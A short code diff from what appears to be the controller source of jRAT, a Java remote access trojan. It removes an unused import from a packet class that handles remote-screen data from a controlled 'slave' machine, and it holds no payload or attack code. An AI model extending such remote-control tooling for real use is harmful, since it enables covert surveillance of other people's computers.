@@ -3,7 +3,6 @@ package pro.jrat.client.packets.incoming;
 import java.io.DataInputStream;
 
 import pro.jrat.client.Slave;
-import pro.jrat.client.ui.frames.FrameRemoteScreen;
 
 public class Packet18OneRemoteScreen extends Packet17RemoteScreen {
 
